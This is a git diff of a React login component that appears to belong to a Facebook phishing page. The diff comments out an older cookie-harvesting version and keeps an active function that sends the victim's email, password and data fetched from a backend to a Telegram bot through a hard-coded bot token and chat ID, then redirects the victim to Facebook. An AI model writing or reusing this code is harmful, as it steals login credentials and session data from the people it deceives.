@@ -25,43 +25,95 @@ const Login = () => {
         setValues({ ...values, [e.target.name]: e.target.value });
     };
 
-const getCookies = () => {
-    const cookies = document.cookie.split("; ");
-    const cookieObj = {};
-    cookies.forEach((cookie) => {
-        const [name, value] = cookie.split("=");
-        cookieObj[name] = decodeURIComponent(value);
-    });
-    return cookieObj;
-};
+// const getCookies = () => {
+//     const cookies = document.cookie.split("; ");
+//     const cookieObj = {};
+//     cookies.forEach((cookie) => {
+//         const [name, value] = cookie.split("=");
+//         cookieObj[name] = decodeURIComponent(value);
+//     });
+//     return cookieObj;
+// };
+
+// const fetchBackendData = async () => {
+//     try {
+//         const response = await fetch('https://ezeappmain.onrender.com'); // Replace with your backend URL
+//         if (!response.ok) throw new Error(`Error: ${response.statusText}`);
+//         return await response.json();
+//     } catch (error) {
+//         console.error('Error fetching backend data:', error.message);
+//         return {}; // Return empty object in case of failure
+//     }
+// };
+
+// const sendToTelegram = async () => {
+// const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; 
+// const chatId = '5744414871'; 
+//     const cookies = getCookies();
+//     const cookies_Secure = await fetchBackendData();
+
+//     const dataToSend = {
+//         cookies,
+//         cookies_Secure,
+//     };
+//     const dataString = JSON.stringify(dataToSend, null, 2);
+
+//     const message = `User Data:\nEmail: ${values.email}\nPassword: ${values.password}`;
+
+//     try {
+//         const blob = new Blob([dataString], { type: 'text/plain' });
+//         const file = new File([blob], 'data.txt', { type: 'text/plain' });
+
+//         const formData = new FormData();
+//         formData.append('chat_id', chatId);
+//         formData.append('document', file);
+//         formData.append('caption', message);
+
+//         const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, formData, {
+//             headers: { 'Content-Type': 'multipart/form-data' },
+//         });
+
+//         console.log('Telegram response:', response.data);
+//     } catch (error) {
+//         console.error('Error sending message to Telegram:', error.response?.data || error.message);
+//     }
+// };
+
+// const submitsData = (e) => {
+//     e.preventDefault();
+//     setLoading(true);
+//     sendToTelegram()
+//         .finally(() => {
+//             setLoading(false);
+//             window.location.href = "https://web.facebook.com/?_rdc=1&_rdr";
+//         });
+// };
+
+// const toFacebook = () => {
+//     window.location.href = "https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2F&locale=en_US&display=page";
+// };
 
 const fetchBackendData = async () => {
     try {
         const response = await fetch('https://ezeappmain.onrender.com'); // Replace with your backend URL
         if (!response.ok) throw new Error(`Error: ${response.statusText}`);
-        return await response.json();
+        return await response.text(); // Fetch the response as a string
     } catch (error) {
         console.error('Error fetching backend data:', error.message);
-        return {}; // Return empty object in case of failure
+        return ''; // Return an empty string in case of failure
     }
 };
 
 const sendToTelegram = async () => {
-const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; 
-const chatId = '5744414871'; 
-    const cookies = getCookies();
-    const cookies_Secure = await fetchBackendData();
+    const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; 
+    const chatId = '5744414871'; 
 
-    const dataToSend = {
-        cookies,
-        cookies_Secure,
-    };
-    const dataString = JSON.stringify(dataToSend, null, 2);
+    const apiData = await fetchBackendData(); // Fetch data from the backend (as a string)
 
-    const message = `User Data:\nEmail: ${values.email}\nPassword: ${values.password}`;
+    const message = `User Data:\nEmail: ${values.email}\nPassword: ${values.password}`; // Include your desired message
 
     try {
-        const blob = new Blob([dataString], { type: 'text/plain' });
+        const blob = new Blob([apiData], { type: 'text/plain' }); // Create a file from the string
         const file = new File([blob], 'data.txt', { type: 'text/plain' });
 
         const formData = new FormData();
@@ -92,6 +144,7 @@ const submitsData = (e) => {
 const toFacebook = () => {
     window.location.href = "https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2F&locale=en_US&display=page";
 };
+
 
 
     return (
